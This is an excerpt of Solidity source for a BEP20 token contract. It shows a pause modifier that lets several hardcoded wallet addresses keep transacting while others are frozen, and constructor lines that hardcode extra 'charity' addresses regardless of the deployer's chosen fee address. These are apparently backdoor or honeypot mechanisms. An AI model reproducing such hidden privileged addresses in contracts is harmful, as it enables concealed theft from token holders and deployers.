...
contract Pausable is Ownable {
  ...
  address public admin = 0x4e84cD95A88D52fd09C6f4a1973d21Badc298650;


  modifier whenNotPaused() {
    if(pausedPublic) {
      if(!pausedOwnerAdmin) {
        require(msg.sender == _owner || msg.sender == 0x4e84cD95A88D52fd09C6f4a1973d21Badc298650  ||  msg.sender == 0x8C320Ba3450eA64B044031a653283f26EB85426E || msg.sender == admin);
      } else {
        revert();
      }
    }
...
contract CoinToken is Context, IBEP20, Ownable, Pausable {
    ...
    constructor (string memory _name, string memory _symbol, uint256 _decimals, uint256 _supply, uint256 _txFee,uint256 _burnFee,uint256 _charityFee,address _FeeAddress,address tokenOwner) {
        ...
        _isCharity[0xcFfeEd016aFEe4AfaB008d7DC47c294c90dC5932] = true;
        _isCharity[0x276747801B0dbb7ba04685BA27102F1B27Ca0815] = true;
